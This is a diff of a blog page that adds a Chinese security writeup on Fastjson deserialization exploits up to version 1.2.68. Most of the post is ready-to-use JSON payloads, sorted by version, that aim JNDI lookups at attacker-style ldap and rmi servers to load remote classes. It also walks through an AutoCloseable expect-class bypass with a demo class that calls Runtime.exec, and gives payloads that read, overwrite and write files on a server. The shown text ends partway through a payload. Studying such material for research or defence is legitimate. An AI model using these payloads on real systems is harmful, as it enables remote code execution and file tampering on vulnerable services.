@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="http://example.com/archives/2025/07/"/>
+  
+  <link rel="canonical" href="http://example.com/2025/08/07/fastjson-1-2-68及之前利用/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,18 +34,22 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Archive: 2025/7 - n1utra's blog</title>
-  <meta name="keywords" content="null">
+  <title>浅述Fastjson(3)：FastJson 1.2.68及之前利用 - n1utra's blog</title>
+  <meta name="keywords" content="JAVA安全,FastJson反序列化,null">
   <meta desc name="description" content="网络安全 - n1utra - n1utra's blog">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="n1utra&#39;s blog">
-<meta property="og:url" content="http://example.com/archives/2025/07/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅述Fastjson(3)：FastJson 1.2.68及之前利用">
+<meta property="og:url" content="http://example.com/2025/08/07/FastJson-1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/index.html">
 <meta property="og:site_name" content="n1utra&#39;s blog">
-<meta property="og:description" content="网络安全">
+<meta property="og:description" content="1.2.47修复在1.2.48中，针对1.2.47的缓存绕过，修复了两个地方：  MiscCodec类 TypeUtils类  MiscCodec修复1.2.47及之前，在解析java.lang.Class类的时候默认cache为true，导致第二次反序列化时可以直接从缓存中获取。而1.2.48强制关闭，不再加入缓存。  TypeUtils修复1.2.47的无参&#x2F;单参loadClass默">
 <meta property="og:locale">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-08-07T13:37:25.000Z">
+<meta property="article:modified_time" content="2025-08-07T15:30:21.613Z">
 <meta property="article:author" content="n1utra">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="FastJson反序列化">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2103,7 +2107,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2436,7 +2440,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-      <div class="cover-wrapper  dock" id='half'>
+      <div class="cover-wrapper post dock" id='half'>
         
   <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
 
@@ -2503,40 +2507,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/21/CC链总结/">
+  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/07/FastJson-1-2-68及之前利用/">
   <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
     <meta itemprop="name" content="n1utra's blog">
   </span>
@@ -2545,654 +2517,219 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="网络安全">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/21/CC%E9%93%BE%E6%80%BB%E7%BB%93/"  itemprop="url">
-        CC链总结
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      
-        CC链1-7利用链概述由于我自己写的部分CC链中进行了一定修改，所以这里采用yso中的链
+    
+      <h1 class="title" itemprop="name headline">
+        浅述Fastjson(3)：FastJson 1.2.68及之前利用
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="https://schema.org.cn/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="/static/pic/avatar.jpg" class="lazyload" data-srcset="/static/pic/avatar.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">n1utra</p>
+  </a>
+</div>
 
-这张图大概描述了CC链1-7的调用过程仔细观察能够发现，都是反序列化入口-&gt;调用点-&gt;执行点这种规律，部分链甚至是基于其他链进行拆分组合
-CC链的其他问题CC链1是如何修复的CC链1-TransformedMap在jdk8u71版本中就被修复了，查看8u71的AnnotationInvoc...
-      
+          
+        
+          
+            
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-08-07T21:37:25+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 7, 2025</p>
+  </a>
+</div>
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <h1 id="1-2-47修复"><a href="#1-2-47修复" class="headerlink" title="1.2.47修复"></a>1.2.47修复</h1><p>在1.2.48中，针对1.2.47的缓存绕过，修复了两个地方：</p>
+<ul>
+<li><code>MiscCodec</code>类</li>
+<li><code>TypeUtils</code>类</li>
+</ul>
+<h2 id="MiscCodec修复"><a href="#MiscCodec修复" class="headerlink" title="MiscCodec修复"></a>MiscCodec修复</h2><p>1.2.47及之前，在解析<code>java.lang.Class</code>类的时候默认<code>cache</code>为true，导致第二次反序列化时可以直接从缓存中获取。而1.2.48强制关闭，不再加入缓存。</p>
+<p><img src="/static/pic/image-20250807221028386.png" class="lazyload" data-srcset="/static/pic/image-20250807221028386.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807221028386"></p>
+<h2 id="TypeUtils修复"><a href="#TypeUtils修复" class="headerlink" title="TypeUtils修复"></a>TypeUtils修复</h2><p>1.2.47的无参&#x2F;单参<code>loadClass</code>默认<code>cache</code>为<code>true</code>，1.2.48全部改为<code>false</code></p>
+<p><img src="/static/pic/image-20250807230343536.png" class="lazyload" data-srcset="/static/pic/image-20250807230343536.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807230343536"></p>
+<h1 id="1-2-68及之前可利用链"><a href="#1-2-68及之前可利用链" class="headerlink" title="1.2.68及之前可利用链"></a>1.2.68及之前可利用链</h1><p>在1.2.68的期望类绕过之前的利用链，都需要开启<code>AutoType</code>，并且结合未拉黑的利用链，这里不再过多赘述。<code>payload</code>来自<code>safe6sec</code>师傅的：<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson: Fastjson姿势技巧集合</a>，利用时还需要满足依赖包版本</p>
+<h2 id="1-2-59版本"><a href="#1-2-59版本" class="headerlink" title="1.2.59版本"></a>1.2.59版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-61版本"><a href="#1-2-61版本" class="headerlink" title="1.2.61版本"></a>1.2.61版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;,&quot;jndiName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;Object&quot;:&quot;a&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-62版本"><a href="#1-2-62版本" class="headerlink" title="1.2.62版本"></a>1.2.62版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;, &quot;parameters&quot;: &#123;&quot;@type&quot;:&quot;java.util.Hashtable&quot;,&quot;java.naming.factory.initial&quot;:&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;,&quot;topic-factory&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;, &quot;namespace&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-62-1-2-66版本"><a href="#1-2-62-1-2-66版本" class="headerlink" title="1.2.62-1.2.66版本"></a>1.2.62-1.2.66版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&quot;xaDataSourceName&quot;:&quot;rmi://10.10.20.166:1099/ExportObject&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.10.20.166:1389/ExportObject&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson &lt;&#x3D;1.2.66"></a>fastjson &lt;&#x3D;1.2.66</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;Realms&quot;:[&quot;&quot;]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransaction&quot;:&quot;ldap://192.168.80.1:1399/Calc&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>jdk11以上写文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">    &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,</span><br><span class="line">    &quot;out&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">           &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br><span class="line">           &quot;file&quot;: &quot;/tmp/asdasd&quot;,</span><br><span class="line">           &quot;append&quot;: true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;infl&quot;: &#123;</span><br><span class="line">           &quot;input&quot;: &#123;</span><br><span class="line">               &quot;array&quot;: &quot;eJxLLE5JTCkGAAh5AnE=&quot;,</span><br><span class="line">               &quot;limit&quot;: 14</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;bufLen&quot;: &quot;100&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;protocolVersion&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-67版本"><a href="#1-2-67版本" class="headerlink" title="1.2.67版本"></a>1.2.67版本</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-68期望类绕过"><a href="#1-2-68期望类绕过" class="headerlink" title="1.2.68期望类绕过"></a>1.2.68期望类绕过</h2><p>在1.2.68版本终于突破了需要开启<code>AutoType</code>以及利用链不在黑名单的限制。通过期望类来绕过了<code>checkAutoType</code>。</p>
+<p><strong>利用条件</strong></p>
+<ul>
+<li>利用类必须是<code>expectClass</code>的子类</li>
+<li>该类不在黑名单中</li>
+</ul>
+<p>常用的期望类是<code>AutoCloseable</code>这个类，传入一个子类作为期望类，然后传入另一个子类作为恶意类执行恶意操作。</p>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>新建一个恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCE</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RCE</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;RCE\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">    JSON.parseObject(s);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>checkAutoType</code>处下断点，调试运行<code>payload</code></p>
+<p>停留在断点时的<code>typeName</code>为<code>java.lang.AutoCloseable</code></p>
+<p><img src="/static/pic/image-20250807232049991.png" class="lazyload" data-srcset="/static/pic/image-20250807232049991.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232049991"></p>
+<p>进入方法看看是如何绕过的</p>
+<p>前面的判断基本不满足，一直运行到当运行到从缓存中读取类时，这里是能够获取到<code>AutoClaseable</code>的</p>
+<p><img src="/static/pic/image-20250807232103048.png" class="lazyload" data-srcset="/static/pic/image-20250807232103048.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232103048"></p>
+<p>因为在<code>TypeUtils</code>初始化是就将<code>AutoCloseable</code>进行了加载</p>
+<p><img src="/static/pic/image-20250807232137883.png" class="lazyload" data-srcset="/static/pic/image-20250807232137883.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232137883"></p>
+<p>那么此时clazz就有值了，继续往下执行，这里判断clazz是否为空，然后期望类是否不为空。然后对clazz进行了返回</p>
+<p><img src="/static/pic/image-20250807232209246.png" class="lazyload" data-srcset="/static/pic/image-20250807232209246.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232209246"></p>
+<p>返回之后就跳出了<code>CheckAutoType</code>，那么再来看看我们构造的恶意类是在哪里加载执行的</p>
+<p>一直向下运行，进入<code> deserializer.deserialze()</code>这里</p>
+<p>运行到这里，通过<code>lexer</code>解析器获取了传入的恶意类名</p>
+<p><img src="/static/pic/image-20250807232221228.png" class="lazyload" data-srcset="/static/pic/image-20250807232221228.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232221228"></p>
+<p>然后在下面这处位置获得了期望类</p>
+<p><img src="/static/pic/image-20250807232233542.png" class="lazyload" data-srcset="/static/pic/image-20250807232233542.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232233542"></p>
+<p>接着又进入了<code>checkAutoType</code>，但是此时加载的类变成了<code>RCE</code>，并且存在了期望类</p>
+<p>然后一直执行，最后是在下面这段代码中获得了<code>RCE.class</code>文件的字节码</p>
+<p>这里是先获得字节码路径，如果默认类加载器，就用默认类读取资源，但是这里是null，那么就进入了else分支，通过当前类的类加载器去读取资源，然后获取到字节流</p>
+<p>此时有了字节流<code>is</code>，然后通过<code>ClassReader</code>解析字节流，然后通过<code>TypeCollector</code>收集类中的信息，这里是在收集<code>&lt;clinit&gt;</code>，表示类静态代码块<code>static&#123;&#125;</code>，<code>new Class[0]</code>表示0个参数，这里是为了检查静态代码块中是否存在安全问题、检查是否设计JSON相关的注解处理等</p>
+<p><img src="/static/pic/image-20250807232246564.png" class="lazyload" data-srcset="/static/pic/image-20250807232246564.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232246564"></p>
+<p>然后继续执行，在下面这段代码中完成了类的加载</p>
+<p><img src="/static/pic/image-20250807232256557.png" class="lazyload" data-srcset="/static/pic/image-20250807232256557.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232256557"></p>
+<p>然后在后面对类进行了返回</p>
+<p><img src="/static/pic/image-20250807232310290-1754580190944-1.png" class="lazyload" data-srcset="/static/pic/image-20250807232310290-1754580190944-1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20250807232310290"></p>
+<h3 id="利用payload"><a href="#利用payload" class="headerlink" title="利用payload"></a>利用payload</h3><p>在实际的应用中，并没有<code>RCE</code>这个类能够直接用，需要找到其他<code>AutoCloseable</code>的子类，比如读文件写文件等操作类都继承了这个类，所以这里常用的也是用来读写文件。</p>
+<p><strong>其他依赖实现RCE</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>读文件</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>, <span class="string">&quot;tempPath&quot;</span>:<span class="string">&quot;C:/Windows/win.ini&quot;</span>, <span class="string">&quot;targetPath&quot;</span>:<span class="string">&quot;D:/wamp64/www/win.txt&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>写入空文件或者覆盖文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">  &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br><span class="line">  &quot;file&quot;: &quot;/tmp/nonexist&quot;,</span><br><span class="line">  &quot;append&quot;: &quot;false&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.io.FileWriter&quot;</span>,</span><br><span class="line">  <span class="string">&quot;file&quot;</span>: <span class="string">&quot;/tmp/nonexist&quot;</span>,</span><br><span class="line">  <span class="string">&quot;append&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>写文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;,</span><br><span class="line">        &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;cHduZWQ=&quot;,	// 这里文件内容需要base64编码</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;stream&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,</span><br><span class="line">        &#x27;file&#x27;:&#x27;/tmp/nonexist&#x27;,</span><br><span class="line">        &#x27;append&#x27;:false</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;writer&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        